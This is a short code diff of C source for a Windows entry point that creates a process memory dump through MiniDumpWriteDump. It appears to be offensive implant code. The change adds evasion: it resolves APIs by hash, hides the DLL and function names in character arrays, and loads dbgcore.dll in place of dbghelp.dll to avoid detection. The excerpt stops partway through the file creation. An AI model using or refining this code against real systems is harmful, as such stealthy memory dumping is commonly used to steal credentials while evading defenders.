@@ -44,6 +44,7 @@ VOID WindowsEntrypoint(LPCSTR szDumpPath)
   GetCurrentProcess_t   GetCurrentProcess   = NULL;
   GetCurrentProcessId_t GetCurrentProcessId = NULL;
   LoadLibraryA_t        LoadLibraryA        = NULL;
+  GetProcAddress_t      GetProcAddress      = NULL;
   MiniDumpWriteDump_t   MiniDumpWriteDump   = NULL;
 
   LPVOID                Kernel32Ptr         = NULL;
@@ -51,19 +52,24 @@ VOID WindowsEntrypoint(LPCSTR szDumpPath)
 
   HANDLE                hFile               = NULL;
 
-  char sz_DbgHelp[]  = { 'd', 'b', 'g', 'h', 'e',
-                         'l', 'p', '.', 'd', 'l',
+  char sz_DbgHelp[]  = { 'd', 'b', 'g', 'c', 'o',
+                         'r', 'e', '.', 'd', 'l',
                          'l', 0 };
+
+  char sz_DbgFunc[]  = { 'M', 'i', 'n', 'i', 'D',
+	  		 'u', 'm', 'p', 'W', 'r',
+			 'i', 't', 'e', 'D', 'u',
+			 'm', 'p', 0 };
 
   Kernel32Ptr         = GetPeBase(HASH_KERNEL32);
   LoadLibraryA        = GetPeFunc(Kernel32Ptr, HASH_LOADLIBRARYA);
   CreateFileA         = GetPeFunc(Kernel32Ptr, HASH_CREATEFILEA);
   GetCurrentProcess   = GetPeFunc(Kernel32Ptr, HASH_GETCURRENTPROCESS);
   GetCurrentProcessId = GetPeFunc(Kernel32Ptr, HASH_GETCURRENTPROCESSID);
-  
-  if ( LoadLibraryA(sz_DbgHelp) != NULL ) {
-    DbgHelpPtr        = GetPeBase(HASH_DBGHELP);
-    MiniDumpWriteDump = GetPeFunc(DbgHelpPtr, HASH_MINIDUMPWRITEDUMP); 
+  GetProcAddress      = GetPeFunc(Kernel32Ptr, HASH_GETPROCADDRESS);
+
+  if ( (DbgHelpPtr = LoadLibraryA(sz_DbgHelp)) != NULL ) {
+    MiniDumpWriteDump = GetProcAddress(DbgHelpPtr, sz_DbgFunc);
 
     hFile = CreateFileA(
 	szDumpPath,
